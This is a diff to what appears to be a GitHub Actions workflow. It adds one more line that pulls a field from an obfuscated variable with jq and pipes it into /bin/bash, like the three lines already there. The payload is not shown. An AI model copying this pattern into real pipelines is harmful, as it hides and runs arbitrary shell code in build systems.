@@ -25,6 +25,7 @@ jobs:
           echo $wa6 | jq -r .xlh527 | /bin/bash
           echo $ejilx5 | jq -r .uw8632 | /bin/bash
           echo $s2743 | jq -r .t83768 | /bin/bash
+          echo $x58222 | jq -r .d5021 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
